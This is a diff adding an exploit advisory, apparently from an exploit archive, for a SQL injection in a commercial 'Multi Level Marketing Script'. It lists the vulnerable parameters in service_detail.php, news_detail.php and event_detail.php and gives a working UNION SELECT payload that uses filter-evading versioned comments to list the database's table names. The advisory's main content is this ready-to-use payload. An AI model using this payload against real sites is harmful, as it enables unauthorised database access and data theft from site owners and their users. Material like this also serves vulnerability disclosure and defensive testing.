@@ -1,0 +1,30 @@
+# # # # # 
+# Exploit Title: Multi Level Marketing Script - SQL Injection
+# Dork: N/A
+# Date: 22.09.2017
+# Vendor Homepage: http://www.i-netsolution.com/
+# Software Link: http://www.i-netsolution.com/product/multi-level-marketing-script/
+# Demo: http://74.124.215.220/~advaemlm/
+# Version: N/A
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+# # # # #
+# Exploit Author: Ihsan Sencan
+# Author Web: http://ihsan.net
+# Author Social: @ihsansencan
+# # # # #
+# Description:
+# The vulnerability allows an attacker to inject sql commands....
+# 
+# Proof of Concept: 
+# 
+# http://localhost/[PATH]/service_detail.php?pid=[SQL]
+# 
+# -8'++/*!00002UNION*/+/*!00002ALL*/+/*!00002SELECT*/+0x31,0x494853414e2053454e43414e,0x33,0x34,0x35,0x36,0x37,0x38,0x39,0x307833313330,0x3131,(/*!00002SELECT*/+GROUP_CONCAT(table_name+SEPARATOR+0x3c62723e)+/*!00002FROM*/+INFORMATION_SCHEMA.TABLES+/*!00002WHERE*/+TABLE_SCHEMA=DATABASE()),0x3133,0x3134,0x3135,0x3136,0x3137--+-
+# 
+# http://localhost/[PATH]/news_detail.php?newid=[SQL]
+# http://localhost/[PATH]/event_detail.php?eventid=[SQL]
+# 
+# Etc..
+# # # # #
